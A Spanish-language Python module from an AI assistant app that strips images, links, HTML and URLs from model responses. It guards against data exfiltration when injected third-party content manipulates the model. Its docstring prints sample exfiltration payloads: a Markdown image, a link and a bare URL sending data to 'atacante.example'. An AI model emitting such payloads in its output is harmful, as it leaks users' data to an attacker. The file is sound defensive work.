# asistente/application/seguridad/sanear_respuesta.py — lo que escribe el modelo, sin canales de salida (módulo 102)
"""Un texto del modelo puede llevar, si un contenido de terceros lo ha manipulado, una forma de SACAR datos:

    ![](https://atacante.example/p.png?d=776,59)     una imagen: el visor que la pinta hace la petición él solo
    [Ver detalle](https://atacante.example/?d=…)     un enlace que alguien pulsa
    https://atacante.example/?d=Supermercado-461     una URL que un visor de Markdown (GFM) convierte en enlace

El chat no pinta nada de eso (markdown-ligero escapa el HTML y no crea enlaces), pero la respuesta también se guarda,
se descarga en Markdown (97) y sale por MCP (104), y ahí no sabemos qué la pinta. Por eso se quita en el origen: los
enlaces de la app los pone el código (un botón, un archivo), nunca el texto del modelo.

Quién decide si hay una imagen o un enlace es un parser CommonMark (markdown-it-py), no una expresión regular:
CommonMark tiene muchas formas de escribir lo mismo (corchetes dentro del texto alternativo, enlaces por referencia
definidos dentro de una cita o de una lista, entidades HTML en la URL, URLs sin esquema, HTML con atributos que cargan
algo) y una regex se queda siempre corta. Con lo que encuentra el parser:

1. se quitan imágenes (queda el texto alternativo), enlaces (queda el texto), definiciones por referencia y HTML;
2. se quitan las URLs que queden (también las que solo un visor GFM convertiría en enlace);
3. se vuelve a preguntar al parser y, si aún ve algo (formas que las expresiones no saben deshacer), se escapan con \\
   los signos que abren esas construcciones ([ ] < > y la propia \\): escapados, CommonMark los lee como texto.

Un texto normal (negritas, listas, cifras) no se toca.
"""

import re

from markdown_it import MarkdownIt

RETIRADO = "[enlace retirado]"

_PARSER = MarkdownIt("commonmark")
_PELIGROSOS = {"image", "link_open", "html_inline", "html_block"}  # link_open también es un autoenlace <https://…>

_ETIQUETA = r"\[((?:[^\[\]\\]|\\.|\[(?:[^\[\]\\]|\\.)*\])*)\]"  # [texto], con un nivel de corchetes dentro
_DESTINO = r"\((?:[^()\\]|\\.|\([^()]*\))*\)"  # (url "título"), con paréntesis dentro
_REFERENCIA = r"\[(?:[^\]\\]|\\.)*\]"  # [etiqueta] de un enlace por referencia (o [] vacía)
_IMAGEN = re.compile(rf"!{_ETIQUETA}(?:{_DESTINO}|{_REFERENCIA})?")
_ENLACE = re.compile(rf"{_ETIQUETA}(?:{_DESTINO}|{_REFERENCIA})")
_DEFINICION = re.compile(r"^[ \t]*(?:(?:>|[-*+]|\d+[.)])[ \t]*)*\[(?:[^\]\\]|\\.)+\]:.*$", re.MULTILINE)
_HTML = re.compile(r"</?[A-Za-z][^>]*>|<!--.*?-->", re.DOTALL)
_URL = re.compile(
    r"(?:\b(?:https?|ftp|file|data|javascript|vbscript)(?::|&#0*58;?|&#x0*3a;?|&colon;)"  # con esquema (o disfrazado)
    r"|(?<![\w/:])//(?=[\w-]+(?:\.[\w-]+)+)"  # sin esquema: //atacante.example/…
    r"|\bwww\.)[^\s<>\"'`)\]]*",
    re.IGNORECASE,
)
_SIGNOS = re.compile(r"[\\\[\]<>]")


def _peligros(texto: str) -> int:
    """Cuántas imágenes, enlaces, trozos de HTML y definiciones por referencia ve un visor CommonMark."""
    entorno: dict = {}
    tokens = _PARSER.parse(texto, entorno)
    hijos = [h for t in tokens for h in (t.children or [])]
    return sum(t.type in _PELIGROSOS for t in [*tokens, *hijos]) + len(entorno.get("references", {}))


def sanear_respuesta(texto: str) -> tuple[str, int]:
    """El texto sin imágenes, enlaces, URLs ni HTML; y cuántas cosas se han quitado (para el log).

    De los enlaces queda el texto (lo que lee la persona); de las imágenes, el texto alternativo si lo hay."""
    quitados = _peligros(texto)
    if quitados:
        texto = _IMAGEN.sub(lambda m: m.group(1), texto)
        texto = _ENLACE.sub(lambda m: m.group(1), texto)
        texto = _DEFINICION.sub("", texto)
        texto = _HTML.sub("", texto)
    texto, urls = _URL.subn(RETIRADO, texto)
    if _peligros(texto):  # lo que las expresiones no han sabido quitar: que se lea como texto
        texto = _SIGNOS.sub(lambda m: "\\" + m.group(0), texto)
    return texto, quitados + urls
